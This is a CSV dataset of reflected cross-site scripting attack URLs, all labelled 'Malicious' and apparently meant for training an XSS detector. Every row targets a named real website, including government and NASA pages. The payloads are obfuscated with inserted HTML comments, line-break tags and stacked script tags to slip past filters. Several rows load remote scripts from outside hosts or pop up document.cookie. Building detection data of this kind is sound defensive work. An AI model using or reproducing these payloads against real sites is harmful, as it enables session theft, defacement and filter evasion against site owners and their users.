Payloads,Class
http://www.xesgalicia.org/vs_accesible/index2.php?seccion=xesgalicia.php&quot;&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;alert`document.coo<br<!--Comment-->><br<!--Comment-->>kie`&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;,Malicious
http://ask.jp/item/item.asp?o=%22%3e%27%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28string.fromcharcode%2866%2c121%2c32%2c<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>107%2c117%2c115%2c111%2c109%2c105%2c115%2c111%2c46%2c99%2c111%2c109%29%29%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%0d%0a&amp;qsrc=<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>9&amp;q=link%3ahttp%3a%2f%2fwww.youtube.com%2fwatch%3fv%3dqvsgrwqgvl0&amp;sm=0&amp;btnitm.x=61&amp;btnitm.y=4,Malicious
http://www.playlist.com/toboggan/offers?profile_cell_number=&quot;&gt;test&amp;agreed=&amp;username=&quot;&gt;&lt;<!--Comment-->/a&gt;&lt;<!--Comment-->/a&gt;&lt;<!--Comment-->/a&gt;&lt;<!--Comment-->/a&gt;&lt;/a<!--Comment-->&gt;&lt;/a<!--Comment-->&gt;&lt;/a<!--Comment-->&gt;&lt;/a<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;t<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>est&lt;!--,Malicious
http://bf1942stats.games.saix.net/game.php?id=%27%22%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%281337%29%3c/sc<br<!--Comment-->>ript%3e%3c/sc<br<!--Comment-->>ript%3e%3c/sc<br<!--Comment-->>ript%3e%3c/sc<br<!--Comment-->>ript%3e%3c<!--Comment-->/sc<br>ript%3e%3c<!--Comment-->/sc<br>ript%3e%3c<!--Comment-->/sc<br>ript%3e%3c<!--Comment-->/sc<br>ript%3e,Malicious
http://www.nero.com/nero7/eng/all_capture_devices.php?back=capture_devices_nh'%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`1<br<!--Comment-->><br<!--Comment-->>337`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3cscript%20src=http://flashgfx.co.uk/xss.js<!--Comment-->%3e%3c<!--Comment-->script%20src=http://flashgfx.co.uk/xss.js%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,Malicious
http://www.chukei.co.jp/cgi-bin/books/search.rb?title='%3e%22%3e%3cscript/src=http://kusomiso.com/xs<br<!--Comment-->>s.js%3e%3cscript/src=http://kusomiso.com/xs<br<!--Comment-->>s.js%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,Malicious
http://goseek.com/search.php?d=webfile.com&amp;cachekey=1189806790&amp;pc=true&amp;term='%3e%22%3e%3cscript/src=<br<!--Comment-->>http://kusomiso.com/x.js%3e%3cscript/src=<br<!--Comment-->>http://kusomiso.com/x.js%3e%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e,Malicious
http://hacker.ws/parking.php4?task=search&amp;domain=hacker.ws&amp;trackquery=1&amp;s=bacb2145d7104258a8ea&amp;tb=0&amp;<br<!--Comment-->><br<!--Comment-->>a_id=1&amp;language=en&amp;pgt=f598oxblhiskewir6zvs-7qoahud7f4khzdrneayayaamirwoam4dq&amp;pxy_t=0&amp;start=1&amp;add_c=<br<!--Comment-->><br<!--Comment-->>e3483f49bc57803ee8a4b852f1601df8&amp;sub=1&amp;keyword=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.c<br<!--Comment-->>om%2fx.js%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.c<br<!--Comment-->>om%2fx.js%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e&amp;search=search,Malicious
http://www.kompass.com/kinl/static/index_kise.php?_lang=en&amp;login=no&amp;action=websearch&amp;_version=006649<br<!--Comment-->><br<!--Comment-->>1208627252&amp;_q=%27%22%3e%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->strong%3e%3c<!--Comment-->strong%3e%3ci<!--Comment-->%3e%3c<!--Comment-->i%3ecueballr%3c<!--Comment-->+i%3e%3c+i<!--Comment-->%3e%3c<!--Comment-->+strong%3e%3c<!--Comment-->+strong%3e%3c+h<br>1<!--Comment-->%3e%3c<!--Comment-->+h<br>1%3e%3c<!--Comment-->+marquee%3e%3c+marquee<!--Comment-->%3e&amp;_keyword=%27%22%3e%3e%3c<!--Comment-->marquee%3e%3c<!--Comment-->marquee%3e%3c<!--Comment-->h1%3e%3ch1<!--Comment-->%3e%3c<!--Comment-->strong%3e%3cstrong<!--Comment-->%3e%3c<!--Comment-->i%3e%3c<!--Comment-->i%3ecueballr%3c+i<!--Comment-->%3e%3c<!--Comment-->+i%3e%3c<!--Comment-->+<br>strong%3e%3c+<br<!--Comment-->>strong%3e%3c<!--Comment-->+h1%3e%3c+h1<!--Comment-->%3e%3c+marquee<!--Comment-->%3e%3c+marquee<!--Comment-->%3e&amp;_choix=ps&amp;_country=&amp;_zone=ww&amp;_region=,Malicious
http://www.museociudadquito.gob.ec/www/busqueda/busqueda.php?buscar=+%2f%2f%22%3e%27%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28%22[_ur0b0r0x_]%22%29%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e,Malicious
http://www.smileyreferrals4you.com/members/register.php?ref=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`;&lt;/scrip<br<!--Comment-->>t&gt;&lt;/scrip<br<!--Comment-->>t&gt;&lt;<!--Comment-->/scrip<br>t&gt;&lt;<!--Comment-->/scrip<br>t&gt;,Malicious
http://www.54ab.com/news.asp?name=%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3ealert`/st@r-gaz3r/`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3cmarquee<!--Comment-->%3e%3c<!--Comment-->marquee%3e%3ch1<!--Comment-->%3e%3ch1<!--Comment-->%3es<br<!--Comment-->><br<!--Comment-->>t@r-gaz3r%3c<!--Comment-->/h1%3e%3c/h1<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e,Malicious
https://resellertest.enom.com/login.asp?page=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`&quot;nemessis-www.rstzone.org-ie6only&quot;`&lt;<!--Comment-->/sc<br>ript&gt;&lt;<!--Comment-->/sc<br>ript&gt;&lt;/sc<br<!--Comment-->>ript&gt;&lt;/sc<br<!--Comment-->>ript&gt;,Malicious
http://www.bombardier.com/en/redirect?url=twitter.com%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`'xss'`%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e,Malicious
http://pds.jpl.nasa.gov/tools/data_dictionary_lookup.cfm?obj=n&amp;search_field=%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`%22xss<br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment-->>%22`%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e&amp;submit=search,Malicious
http://www.grants.ord.sa.gov.au/search.asp?keyword=%22%3cscript+src%3dhttp://vuln.xssed.net/thirdpar<br<!--Comment-->>ty/scripts/hotpockets.js%3e%3cscript+src%3dhttp://vuln.xssed.net/thirdpar<br<!--Comment-->>ty/scripts/hotpockets.js%3e%3cscript+src%3dhttp://vuln.xssed.net/thirdpar<br<!--Comment-->>ty/scripts/hotpockets.js%3e%3cscript+src%3dhttp://vuln.xssed.net/thirdpar<br<!--Comment-->>ty/scripts/hotpockets.js%3e,Malicious
http://www.cossmil.gov.bo/hospimil/postales/tools/calendar.php?month=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;<!--Comment-->script&gt;alert`document.cookie<br<!--Comment-->><br<!--Comment-->>`&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;,Malicious
http://www.atomicbobs.com/search.php?filter=default&amp;keyword=%22%3e%27%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`123`%3c/sc<br>ript<!--Comment-->%3e%3c/sc<br>ript<!--Comment-->%3e%3c<!--Comment-->/sc<br>ript%3e%3c<!--Comment-->/sc<br>ript%3e,Malicious
http://sexicq.ru/topic.php?id=%27%22%3e%3c<!--Comment-->/title%3e%3c/title<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`%22xss%22`;%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%3cmarq<br<!--Comment-->>uee%20bgcolor=%22red%22%3e%3cmarq<br>uee%20bgcolor=%22red%22<!--Comment-->%3e%3ch1<!--Comment-->%3e%3ch1<!--Comment-->%3exss%20by%20xylitol%3c<!--Comment-->/h1%3e%3c/h1<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e,Malicious
http://harmanim.co.il/index/search.php?search=%27%22%3e%3c<!--Comment-->%2ftitle%3e%3c<!--Comment-->%2ftitle%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3ealert`1337`%3c%2fsc<br>ript<!--Comment-->%3e%3c%2fsc<br>ript<!--Comment-->%3e%d7%97%d7%a4%d7%a9+%d7%95%d7%99%d7%93%d7%90%d7%95,Malicious
http://www.now7.co.uk/videogallery_watch_view.php?id=92%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`'airroxssed'`;%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e%3c<!--Comment-->/scr<br>ipt%3e%3c<!--Comment-->/scr<br>ipt%3e%3c<!--Comment-->/scr<br>ipt%3e%3c<!--Comment-->/scr<br>ipt%3e%3c<!--Comment-->/scr<br>ipt%3e%3c<!--Comment-->/scr<br>ipt%3e%3c<!--Comment-->/scr<br>ipt%3e%3c<!--Comment-->/scr<br>ipt%3e,Malicious
http://www.excite.co.jp/world/chinese/web/proceeding/?wb_url=http%3a%2f%2fkusomiso.com%2f%22%3e%27%3<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28%22kusomiso.com%22%29%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e&amp;wb_submit=%e3%82%a6%e3%82%a7%e3%83%96%e3%8<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>3%9a%e3%83%bc%e3%82%b8%e7%bf%bb%e8%a8%b3&amp;wb_lp=chja,Malicious
"http://tv.mofile.com/tags/%22%3e%3c<!--Comment-->marquee%3e%3cmarquee<!--Comment-->%3edeafced%20by%20sponsfull%3c/marquee<!--Comment-->%3e%3c<!--Comment-->/marquee%3e:0,1,10,1,0,0,aud<br<!--Comment-->><br<!--Comment-->>ittime,0,",Malicious
http://douane.gouv.fr/contact.asp?type=%22%3e'%3e%3cscript%20src=http://vuln.xssed.net/thirdparty/sc<br<!--Comment-->>ripts/python5.js%3e%3cscript%20src=http://vuln.xssed.net/thirdparty/sc<br>ripts/python5.js<!--Comment-->%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e,Malicious
http://www.esenyayinlari.com.tr/veri/urun/urunler.asp?kategori_id=10&amp;kategori_adi=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;<!--Comment-->script&gt;alert`/f<br<!--Comment-->><br<!--Comment-->>ck/`&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;,Malicious
http://www.nod32.se/t_product_view.php?product_id=&quot;&gt;&lt;script%20%0a%0d<!--Comment-->&gt;&lt;script%20%0a%0d<!--Comment-->&gt;&lt;<!--Comment-->script%20%0a%0d&gt;&lt;<!--Comment-->script%20%0a%0d&gt;alert`41551.8863228704`%3b&lt;/scr<br>ipt<!--Comment-->&gt;&lt;/scr<br>ipt<!--Comment-->&gt;&lt;<!--Comment-->/scr<br>ipt&gt;&lt;<!--Comment-->/scr<br>ipt&gt;,Malicious
http://www.mercadolibre.com.uy/uruguay/ml/l_user.main?as_filtro_id=certified_usr&as_nickname=%a0&as_pcia_id=%3e%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28%27xss%27%29;%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,Malicious
http://www.okuluygulamalari.net/okuluygulamalari.net/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;scrip<br>t<!--Comment-->&gt;&lt;scrip<br>t<!--Comment-->&gt;alert`document.cookie`&lt;<!--Comment-->/script&gt;&lt;/script<!--Comment-->&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;www.raptr.us.tc&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/h1&gt;,Malicious
